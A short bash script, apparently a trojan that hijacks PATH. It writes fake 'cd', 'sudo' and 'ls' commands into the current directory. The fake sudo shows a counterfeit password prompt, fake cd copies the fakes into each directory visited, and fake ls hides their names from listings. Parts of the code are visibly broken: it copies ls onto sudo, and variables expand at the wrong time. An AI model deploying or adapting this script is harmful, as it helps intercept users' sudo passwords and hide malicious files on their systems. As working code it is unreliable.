#!/bin/bash

PATH=.:$PATH

echo "#!/bin/bash" > cd
echo "/usr/bin/cp cd $1/cd" >> cd
echo "/usr/bin/cp sudo $1/sudo" >> cd
echo "/usr/bin/cp ls $1/sudo" >> cd
echo "/usr/bin/cd $1" >> cd
chmod +x cd

echo "#!/bin/bash" > sudo
echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
echo "echo $p | /usr/bin/sudo -S $@" >> sudo
chmod +x sudo

echo "#!/bin/bash" > ls
echo "/usr/bin/ls $@ | sed 's/ls//g' | sed 's/cd//g' | sed 's/sudo//g' | column" >> ls
chmod +x ls
